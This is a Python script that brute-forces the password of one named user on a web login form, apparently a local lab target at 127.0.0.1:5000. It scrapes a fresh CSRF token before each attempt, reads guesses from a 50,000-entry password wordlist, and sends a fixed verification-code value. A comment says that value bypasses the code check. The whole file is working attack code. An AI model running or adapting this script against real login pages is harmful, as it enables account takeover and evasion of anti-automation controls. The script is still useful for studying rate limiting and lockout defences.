#coding=utf-8
import sys
import requests
from bs4 import BeautifulSoup

UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0"
URL = 'http://127.0.0.1:5000/login'

def GET():
    session=requests.Session()
    s=session.get(URL)
    soup=BeautifulSoup(s.content,"html.parser")
    csrf_token=soup.find(id='csrf_token')['value']
    # print(csrf_token)
    print("GET successfully")
    return csrf_token,session

def POST(user,password,UA,token,session):
        # what the verify code is does not matter, even if 'verification'!='code'
        post_data = {}
        post_data['username'] = user
        post_data['password'] = password
        post_data['verification'] = 'b0ts'
        post_data['code']='B0T1'
        post_data['submit']='login'
        post_data['csrf_token']=token
        headers ={
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "%s"%URL,
        "Connection": "close"}
        resp = session.post(url=URL,data=post_data,headers=headers)
        print("POST: name:"+user+", password:"+password+" ")
        if resp.text.find('Login successfully')!=-1:
            print('*** find user:', user, 'with password:', password, '***')
            return 1
        else:
            return 0
            # print(resp.text)

# brute the password of special user
def brute(user,password):
    csrf_token,session=GET()
    return POST(user,password,UA,csrf_token,session)

def main():
    tsk = []
    dictfile='top50000pwd'
    user='TonyLin'
    with open(dictfile,'r',encoding='utf-8') as f:
        for line in f.readlines():
            pwd=line.strip('\n')
            ret=brute(user,pwd)
            if ret==1:
                break

def DEBUG():
    user='TonyLin'
    password='123456'
    brute(user,password)

_DEBUG=True

if __name__ == '__main__':
    if _DEBUG:
        DEBUG()
    else:
        main()
